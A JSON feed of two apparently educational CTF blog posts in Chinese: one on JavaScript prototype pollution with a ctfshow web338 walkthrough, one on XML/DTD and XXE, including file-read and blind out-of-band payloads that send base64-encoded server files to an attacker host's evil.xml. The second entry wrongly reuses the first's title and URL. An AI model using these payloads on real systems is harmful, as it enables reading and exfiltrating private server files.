{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"ctf原理\" category",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/6882c75c/",
            "url": "http://dpm12345.cn/posts/6882c75c/",
            "title": "JavaScript 原型链污染(Prototype).md",
            "date_published": "2023-08-15T12:15:40.000Z",
            "content_html": "<p>JavaScript是一门非常灵活的语言，我感觉在某些方面可能比PHP更加灵活。所以，除了传统的SQL注入、代码执行等注入型漏洞外，也会有一些独有的安全问题，比如prototype污染。</p>\n<h1 id=\"prototype和-proto\"><a href=\"#prototype和-proto\" class=\"headerlink\" title=\"prototype和__proto__\"></a><code>prototype</code>和<code>__proto__</code></h1><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>\n<pre><code class=\"javascript\">function Foo() {\n    this.state = 1\n}\n\nnew Foo()\n</code></pre>\n<p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.state</code>就是<code>Foo</code>类的一个属性。</p>\n<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>\n<p>一个类必然有一些方法，类似属性<code>this.state</code>，我们也可以将方法定义在构造函数内部：</p>\n<pre><code class=\"javascript\">function Foo() {\n    this.state = 1\n    this.show = function() {\n        console.log(this.state)\n    }\n}\n\n(new Foo()).show()\n</code></pre>\n<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>\n<p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>\n<pre><code class=\"javascript\">function Foo() {\n    this.state = 1\n}\n\nFoo.prototype.show = function show() {\n    console.log(this.state)\n}\n\nlet foo = new Foo()\nfoo.show()\n</code></pre>\n<p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>\n<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的(即，若<code>foo</code>是<code>Foo</code>类实例化的一个对象，那么<code>foo.prototype</code>是无法使用的。这时候，就该<code>__proto__</code>登场了。</p>\n<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>\n<pre><code class=\"javascript\">foo.__proto__ == Foo.prototype\n</code></pre>\n<p>总结：</p>\n<ol>\n<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>\n<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>\n</ol>\n<h1 id=\"JavaScript原型链继承\"><a href=\"#JavaScript原型链继承\" class=\"headerlink\" title=\"JavaScript原型链继承\"></a>JavaScript原型链继承</h1><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>\n<p>如：</p>\n<pre><code class=\"javascript\">function Father() {\n    this.first_name = 'Donald'\n    this.last_name = 'Trump'\n}\n\nfunction Son() {\n    this.first_name = 'Melania'\n}\n\nSon.prototype = new Father()\n\nlet son = new Son()\nconsole.log(`Name: ${son.first_name} ${son.last_name}`)\n</code></pre>\n<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>\n<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>\n<ol>\n<li>在对象son中寻找last_name</li>\n<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>\n<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>\n<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>\n</ol>\n<p><img data-src=\"/./../../../post_images/javascript_prototype_1.png\" alt=\"image-20230815221255583\"></p>\n<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>\n<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>\n<ol>\n<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>\n<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>\n<li>JavaScript使用prototype链实现继承机制</li>\n</ol>\n<h1 id=\"原型链污染\"><a href=\"#原型链污染\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h1><p>简单来说，根据前面的介绍，即对象与类之间的关系，比如一个<code>Foo</code>类的实例对象<code>foo</code>，<code>foo.__proto__ == Foo.prototype</code>,如果对<code>foo.__proto__</code>进行修改而在之后，<code>Foo</code>类的实例化对象的属性由于继承关系将会随之改变</p>\n<p>如下面的代码</p>\n<pre><code class=\"javascript\">// foo是一个简单的JavaScript对象\nlet foo = {bar: 1}\n\n// foo.bar 此时为1\nconsole.log(foo.bar)\n\n// 修改foo的原型（即Object）\nfoo.__proto__.bar = 2\n\n// 由于查找顺序的原因，foo.bar仍然是1\nconsole.log(foo.bar)\n\n// 此时再用Object创建一个空的zoo对象\nlet zoo = {}\n\n// 查看zoo.bar\nconsole.log(zoo.bar)\n</code></pre>\n<p><img data-src=\"/./../../../post_images/javascript_prototype_2.png\" alt=\"image-20230815221822410\"></p>\n<p>可以看到输出了<code>1 1 2</code>，证明原型链被污染，成功修改了原来的类</p>\n<p>原理：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>\n<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = {}</code>，zoo对象自然也有一个bar属性了。</p>\n<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>\n<h1 id=\"原型链污染可能发生的场景\"><a href=\"#原型链污染可能发生的场景\" class=\"headerlink\" title=\"原型链污染可能发生的场景\"></a>原型链污染可能发生的场景</h1><ul>\n<li>对象merge</li>\n<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>\n</ul>\n<p>以对象merge为例，我们想象一个简单的merge函数：</p>\n<pre><code class=\"javascript\">function merge(target, source) {\n    for (let key in source) {\n        if (key in source &amp;&amp; key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\n</code></pre>\n<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，就可以顺势原型链污染</p>\n<p>用如下代码实验一下：</p>\n<pre><code class=\"javascript\">let o1 = {}\nlet o2 = {a: 1, \"__proto__\": {b: 2}}\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = {}\nconsole.log(o3.b)\n</code></pre>\n<p><img data-src=\"/./../../../post_images/javascript_prototype_3.png\" alt=\"image-20230815222140080\"></p>\n<p>但现在的输出似乎与之前的设想有所违背，但这是因为，我们用JavaScript创建o2的过程（<code>let o2 = {a: 1, \"__proto__\": {b: 2}}</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，拿到的仅为<code>{a:1,b:2}</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>\n<p>而要让<code>__proto__</code>被识别为一个键，下面的写法可以实现</p>\n<pre><code class=\"javascript\">let o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n\no3 = {}\nconsole.log(o3.b)\n</code></pre>\n<p>这里使用<code>JSON.parse</code></p>\n<p><img data-src=\"/./../../../post_images/javascript_prototype_4.png\" alt=\"image-20230815222650451\"></p>\n<p>成功修改了<code>b</code>，从而实现了原型链污染</p>\n<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>\n<h1 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h1><p>ctfshow web入门 web 338</p>\n<p>common.js</p>\n<pre><code class=\"javascript\">module.exports = {\n  copy:copy\n};\n\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 &amp;&amp; key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n  }\n</code></pre>\n<p>而在login.js中</p>\n<pre><code class=\"javascript\">/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n  \n  \n});\n</code></pre>\n<p>通过调用copy将请求发送来的json数据进行copy，而在该代码中，<code>secret={}</code>，为了使得其有属性<code>ctfshow</code>，故可以通过修改发送的json数据，添加<code>__proto__</code>，增添<code>ctfshow：'36dboy'</code></p>\n<p>，从而影响Object类，继承，从而使得secret含有属性<code>ctfshow</code>,并且值为<code>36dboy</code></p>\n<p><img data-src=\"/./../../../post_images/ctfshow/Web-vip/web_338_1.png\" alt=\"web_338_1\"></p>\n",
            "tags": [
                "CTF",
                "web",
                "javascript"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/6882c75c/",
            "url": "http://dpm12345.cn/posts/6882c75c/",
            "title": "JavaScript 原型链污染(Prototype).md",
            "date_published": "2023-06-15T12:15:40.000Z",
            "content_html": "<h2 id=\"简单了解XXE\"><a href=\"#简单了解XXE\" class=\"headerlink\" title=\"简单了解XXE\"></a>简单了解XXE</h2><ul>\n<li>XML 指可扩展标记语言（EXtensible Markup Language）</li>\n<li>XML 是一种标记语言，很类似 HTML</li>\n<li>XML 被设计为传输和存储数据，其焦点是数据的内容</li>\n<li>XML 被设计用来结构化、存储以及传输信息</li>\n<li>XML 允许创作者定义自己的标签和自己的文档结构</li>\n</ul>\n<h2 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h2><pre><code>* 注释与HTML相似,为 &lt;!-- 和 --&gt;\n* 大小写敏感\n* 必须有，且只能有一个根元素(如上，根元素即为 students)\n</code></pre>\n<h2 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h2><pre><code>XML 文档声明，在文档的第一行\nXML 文档类型定义，即DTD，XXE 漏洞所在的地方\nXML 文档元素\n</code></pre>\n<h2 id=\"XML文档\"><a href=\"#XML文档\" class=\"headerlink\" title=\"XML文档\"></a>XML文档</h2><pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?&gt;\n&lt;!--第一行是XML声明--&gt;\n&lt;!--这是XML处理指令的例子。处理指令以&lt;?开始，以?&gt;结束--&gt;\n&lt;!--在&lt;?后的第一个单词是处理指令名，在本例中是xml--&gt;\n&lt;!--处理指令一定要顶格写，前面不能有任何空白--&gt;\n\n&lt;students&gt;\n\n    &lt;GREETING&gt;&lt;!--开始标记--&gt; Hello World &lt;!--元素内容--&gt;\n    &lt;/GREETING&gt;&lt;!--结束标记--&gt;\n\n    &lt;student gender=\"male\" isHandsome=\"true\"&gt;\n        &lt;id&gt;001&lt;/id&gt;\n        &lt;name&gt;zhangsan&lt;/name&gt;\n        &lt;address&gt;Beijing&lt;/address&gt;\n        &lt;score&gt;50&lt;/score&gt;\n    &lt;/student&gt;\n\n    &lt;student gender=\"female\"&gt;\n        &lt;id&gt;002&lt;/id&gt;\n        &lt;name&gt;lisi&lt;/name&gt;\n        &lt;address&gt;北京&lt;/address&gt;\n        &lt;score /&gt;&lt;!--为空的简写形式--&gt;\n    &lt;/student&gt;\n\n&lt;/students&gt;\n</code></pre>\n<h3 id=\"文档说明\"><a href=\"#文档说明\" class=\"headerlink\" title=\"文档说明\"></a>文档说明</h3><p>每一个XML文档都以一个XML声明开始，用以指明所用的XML的版本。</p>\n<p>XML声明有 version 、encoding 和 standalone 特性。</p>\n<ul>\n<li><p>version特性表明这个文档符合XML 1.0规范。</p>\n</li>\n<li><p>encoding 属性指定了编码格式，默认情况下是<strong>utf-8</strong>，这个属性要放在属性前面。</p>\n</li>\n<li><p>像standalone是XML文档的属性，位于等号左边的是特姓名，而其值位于等号的右边，并用<strong>双引号或单引号</strong>括起来。</p>\n</li>\n</ul>\n<p>自定义的元素也可以有一个或多个属性，其属性值使用单引号或者双引号括起来</p>\n<p>属性的形式为：<strong>属性名= “属性值”，</strong>比如 <code>gender=\"male\"</code></p>\n<p>多个属性值之间用空格隔开（一个或多个空格都可以）</p>\n<p>在一个元素上，相同的属性只能出现一次</p>\n<p>属性值不能包含<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code></p>\n<h3 id=\"实体\"><a href=\"#实体\" class=\"headerlink\" title=\"实体\"></a>实体</h3><p>实体叫ENTITY，实体的作用是避免重复输入。在XML中，有 5 个预定义的实体引用</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">实体</th>\n<th align=\"center\">符号</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"><code>&amp;it;</code></td>\n<td align=\"center\">&lt;</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;gt;</code></td>\n<td align=\"center\">&gt;</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;amp;</code></td>\n<td align=\"center\">&amp;</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;quot;</code></td>\n<td align=\"center\">“</td>\n</tr>\n<tr>\n<td align=\"center\"><code>&amp;apos;</code></td>\n<td align=\"center\">‘</td>\n</tr>\n</tbody></table>\n<p><strong>自定义实体语法：</strong></p>\n<pre><code class=\"xml\">&lt;!DOCTYPE 根元素[\n&lt;!ENTITY 实体名 \"实体内容\"&gt;\n\n]&gt;\n</code></pre>\n<h3 id=\"处理指令PI\"><a href=\"#处理指令PI\" class=\"headerlink\" title=\"处理指令PI\"></a>处理指令PI</h3><p><strong>处理指令</strong>用于XML解析器传递信息到应用程序。</p>\n<p>语法：<code>&lt;?目标 指令?&gt;</code></p>\n<p>PI必须以一个叫做目标的标识符开头，这个标识符遵从如同元素和属性一样的规则，<strong>目标</strong>是指令所指向的应用的名称，<strong>指令</strong>是传递给应用程序的信息。</p>\n<h3 id=\"CDATA节\"><a href=\"#CDATA节\" class=\"headerlink\" title=\"CDATA节\"></a>CDATA节</h3><p>用于把整段文本解释为纯字符数据而不是标记的情况。</p>\n<p>包含大量的&lt;、&gt;、&amp;、或者”字符。CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是XML标记。</p>\n<p>可以放置除<code>]]&gt;</code>外的任何字符，不能嵌套</p>\n<pre><code class=\"xml\">&lt;![CDATA[\n......\n]]&gt;\n</code></pre>\n<h3 id=\"PCDATA节\"><a href=\"#PCDATA节\" class=\"headerlink\" title=\"PCDATA节\"></a>PCDATA节</h3><p><code>PCDATA</code>表示已解析的字符数据。</p>\n<p><code>PCDATA</code>的意思是被解析的字符数据<code>（parsed character data）</code>。可以把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。<code>PCDATA</code>是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。但是，被解析的字符数据不应当包含任何<code>&amp; &lt; &gt;</code>字符；需要使用<code>&amp; &lt; &gt;</code>实体来分别替换它们。</p>\n<h2 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h2><p><code>XXE漏洞存在的地方</code></p>\n<h3 id=\"三种应用形式\"><a href=\"#三种应用形式\" class=\"headerlink\" title=\"三种应用形式\"></a>三种应用形式</h3><pre><code class=\"xml\">1.内部DTD文档\n&lt;!DOCTYPE 根元素[定义内容]&gt;\n\n2.外部DTD文档\n&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\"&gt;\n\n3.内外部DTD文档结合\n&lt;!DOCTYPE 根元素 SYSTEM \"DTD文件路径\" [定义内容]&gt;\n</code></pre>\n<p>如</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note [\n    &lt;!ELEMENT note (to,from,heading,body)&gt;\n    &lt;!ELEMENT to (#PCDATA)&gt;\n    &lt;!ELEMENT from (#PCDATA)&gt;\n    &lt;!ELEMENT heading (#PCDATA)&gt;\n    &lt;!ELEMENT body (#PCDATA)&gt;\n]&gt;\n&lt;note&gt;\n    &lt;to&gt;Tove&lt;/to&gt;\n    &lt;from&gt;Jani&lt;/from&gt;\n    &lt;heading&gt;Reminder&lt;/heading&gt;\n    &lt;body&gt;Don't forget me this weekend&lt;/body&gt;\n&lt;/note&gt;\n</code></pre>\n<p>在这里，以下有点类似于类型说明，</p>\n<pre><code class=\"xml\">&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to (#PCDATA)&gt;\n&lt;!ELEMENT from (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body (#PCDATA)&gt;\n</code></pre>\n<p>如果采用外部DTD文档，那么将上面的内容写到<code>note.dtd</code>的话，即，有点类似于头文件的作用，变量声明</p>\n<p>note.dtd</p>\n<pre><code class=\"xml\">&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to (#PCDATA)&gt;\n&lt;!ELEMENT from (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body (#PCDATA)&gt;\n</code></pre>\n<p>那么原来的文件可以改为</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;\n&lt;note&gt;\n  &lt;to&gt;Tove&lt;/to&gt;\n  &lt;from&gt;Jani&lt;/from&gt;\n  &lt;heading&gt;Reminder&lt;/heading&gt;\n  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;\n&lt;/note&gt;\n</code></pre>\n<h3 id=\"DTD元素\"><a href=\"#DTD元素\" class=\"headerlink\" title=\"DTD元素\"></a>DTD元素</h3><p>在一个 DTD 中，元素通过元素声明来进行声明。</p>\n<p><strong>声明一个元素</strong></p>\n<pre><code class=\"xml\">&lt;!ELEMENT element-name category&gt;\n或\n&lt;!ELEMENT element-name (element-content)&gt;\n\n；例如\n&lt;!ELEMENT br EMPTY&gt;  表示空元素\n&lt;!ELEMENT element-name (#PCDATA)&gt;  表示只有PCDATA的元素\n&lt;!ELEMENT element-name ANY&gt;        带有任何内容的元素\n&lt;!ELEMENT element-name (child1)&gt; 或  &lt;!ELEMENT element-name (child1,child2,...)&gt;   带有子序列的元素\n等等\n</code></pre>\n<h3 id=\"DTD属性\"><a href=\"#DTD属性\" class=\"headerlink\" title=\"DTD属性\"></a>DTD属性</h3><p>在 DTD 中，属性通过 ATTLIST 声明来进行声明。</p>\n<pre><code class=\"xml\">&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;\n\nDTD 实例:\n\n&lt;!ATTLIST payment type CDATA \"check\"&gt;\n\nXML 实例:\n\n&lt;payment type=\"check\" /&gt;\n</code></pre>\n<h3 id=\"DTD实体\"><a href=\"#DTD实体\" class=\"headerlink\" title=\"DTD实体\"></a>DTD实体</h3><p>类似于变量的定义，可以使用<code>&amp;name</code>进行引用</p>\n<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>\n<pre><code class=\"xml\">DTD 实例:\n\n&lt;!ENTITY writer \"Donald Duck.\"&gt;\n&lt;!ENTITY copyright \"Copyright runoob.com\"&gt;\n\nXML 实例：\n\n&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;\n</code></pre>\n<h2 id=\"XXE漏洞\"><a href=\"#XXE漏洞\" class=\"headerlink\" title=\"XXE漏洞\"></a>XXE漏洞</h2><h3 id=\"有回显\"><a href=\"#有回显\" class=\"headerlink\" title=\"有回显\"></a>有回显</h3><p>直接将文件地址写出，然后显示即可</p>\n<p>如</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM \"file:///D://1.txt\"&gt;]&gt;\n&lt;root&gt;&amp;file;&lt;/root&gt;\n</code></pre>\n<h3 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h3><p>无回显的文件读取可以通过 blind XXE 方法加上外带数据通道（ooB）来提取数据</p>\n<p>先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器来读取数据。</p>\n<p>payload</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE test[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=D:/1.txt\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://xxx.xxx.xxx.xxx/evil.xml\"&gt;\n%dtd;\n%send;\n]&gt;\n</code></pre>\n<p>evil.xml</p>\n<pre><code class=\"xml\">&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/?content=%file;'&gt;\"&gt; %payload;\n//%号要进行实体编码成&amp;#x25\n</code></pre>\n<p>监控日志再 base64 解码就是外带出来的数据</p>\n<p>简单解释一下：其实就是连续调用了 三个参数实体（%dtd，%payload，%file），</p>\n<p>先 %dtd 请求远程服务器（攻击机）上的 evil.xml，然后 %payload 调用了 %file ，%file 获取对方服务器上的敏感文件，最后替换 %send，数据被发送到我们远程的服务器，就实现了数据的外带</p>\n<p>两种参考模板</p>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE data [\n&lt;!ENTITY % file SYSTEM \"file:///c://test/1.txt\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://localhost:88/evil.xml\"&gt; \n%dtd; %all; \n]&gt; \n&lt;value&gt;&amp;send;&lt;/value&gt;\n\nevil.xml文件内容为\n&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;\"&gt;\n</code></pre>\n<pre><code class=\"xml\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE root [\n&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=c:/test/1.txt\"&gt;\n&lt;!ENTITY % dtd SYSTEM \"http://localhost:88/evil.xml\"&gt;\n%dtd;\n%send;\n]&gt;\n&lt;root&gt;&lt;/root&gt;\n\nevil.xml文件内容为：\n&lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://localhost:88/?content=%file;'&gt;\"&gt; %payload;\n</code></pre>\n",
            "tags": [
                "CTF",
                "web",
                "XXE"
            ]
        }
    ]
}